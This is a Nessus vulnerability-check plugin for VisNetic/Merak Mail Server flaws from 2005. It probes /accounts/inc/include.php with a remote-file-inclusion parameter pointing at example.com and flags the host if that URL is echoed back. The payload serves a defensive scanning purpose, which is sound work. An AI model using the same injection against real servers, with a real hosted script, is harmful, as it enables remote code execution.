#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20346);
  script_version("1.20");

  script_cve_id("CVE-2005-4556", "CVE-2005-4557", "CVE-2005-4558", "CVE-2005-4559");
  script_bugtraq_id(16069);

  script_name(english:"VisNetic / Merak Mail Server Multiple Remote Vulnerabilities");
  script_summary(english:"Checks for VisNetic Mail Server arbitrary script include");

  script_set_attribute(attribute:"synopsis", value:
"The remote webmail server is affected by multiple vulnerabilities
that could allow an attacker to execute arbitrary commands on the
remote host." );
  script_set_attribute(attribute:"description", value:
"The remote host is running VisNetic / Merak Mail Server, a multi-
featured mail server for Windows. 

The webmail and webadmin services included in the remote version of
this software are prone to multiple flaws.  An attacker could send
specially crafted URLs to execute arbitrary scripts, perhaps taken
from third-party hosts, or to disclose the content of files on the
remote system." );
  script_set_attribute(attribute:"see_also", value:"https://secuniaresearch.flexerasoftware.com/community/research/" );
  script_set_attribute(attribute:"see_also", value:"http://www.deerfield.com/download/visnetic-mailserver/" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to Merak Mail Server 8.3.5.r / VisNetic Mail Server version
8.3.5 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2005-4556");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/28");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/27");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");
  script_family(english:"CGI abuses");

  script_dependencie("http_version.nasl");
  script_require_ports(32000, "Services/www");
  script_require_keys("www/PHP");
  exit(0);
}

#
# da code
#

include("http_func.inc");
include("http_keepalive.inc");

if ( !get_kb_item("Settings/disable_cgi_scanning") )
 port = get_http_port(default:32000, embedded:TRUE);
else
 port = 32000;

if(!get_port_state(port))exit(0);
if (!can_host_php(port:port)) exit(0);

# nb: software is accessible through either "/mail" (default) or "/".
dirs = make_list("/mail", "");
foreach dir (dirs) {
  req = http_get(item:string(dir, "/accounts/inc/include.php?language=0&lang_settings[0][1]=http://example.com/nessus/"), port:port);
  r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if("http://example.com/nessus/alang.html" >< r)
  {
   security_hole(port);
   exit(0);
  }
}
